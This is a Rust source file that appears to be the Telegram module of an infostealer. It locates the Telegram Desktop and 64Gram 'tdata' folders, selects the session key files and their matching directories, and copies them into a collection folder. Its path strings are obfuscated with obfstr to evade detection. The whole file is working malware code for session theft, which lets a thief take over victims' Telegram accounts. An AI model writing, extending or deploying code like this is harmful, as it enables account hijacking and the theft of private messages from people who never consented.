use alloc::borrow::ToOwned;
use alloc::fmt::format;
use alloc::{format, vec};
use collector::{Collector, Software};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
use obfstr::obfstr as s;
use tasks::Task;

pub(super) struct TelegramTask;

impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let appdata = &Path::appdata();
        let paths = [
            (
                s!("Telegram Desktop").to_owned(),
                appdata / s!("Telegram Desktop") / s!("tdata"),
            ),
            (
                s!("64Gram Desktop").to_owned(),
                appdata / s!("64Gram Desktop") / s!("tdata"),
            ),
        ];

        for (client, tdata_path) in paths {
            if StorageFileSystem.is_exists(&tdata_path) {
                let dst = parent / client;
                copy_tdata(&tdata_path, filesystem, &dst, collector);
            }
        }
    }
}

fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
where
    C: Collector,
    F: FileSystem,
{
    if !StorageFileSystem.is_exists(tdata / s!("key_datas")) {
        return;
    }

    let mut contents = vec![];
    let mut files = vec![];
    let mut dirs = vec![];

    if let Some(list_files) = StorageFileSystem.list_files(tdata) {
        for path in list_files {
            if StorageFileSystem.is_file(&path) {
                files.push(path);
            } else if StorageFileSystem.is_dir(&path) {
                dirs.push(path);
            }
        }
    }

    for file in &files {
        for dir in &dirs {
            if let Some(dir_name) = dir.name()
                && let Some(file_name) = file.name()
                && dir_name == format!("s{file_name}")
            {
                contents.push(file);
                contents.push(dir);
            }
        }
    }

    if !contents.is_empty() {
        collector.get_software().set_telegram();
    }

    for path in contents {
        if StorageFileSystem.is_file(path) {
            let _ = copy_file(StorageFileSystem, path, dst_filesystem, dst, true);
        } else if StorageFileSystem.is_dir(path) {
            let _ = copy_folder(StorageFileSystem, path, dst_filesystem, dst);
        }
    }

}
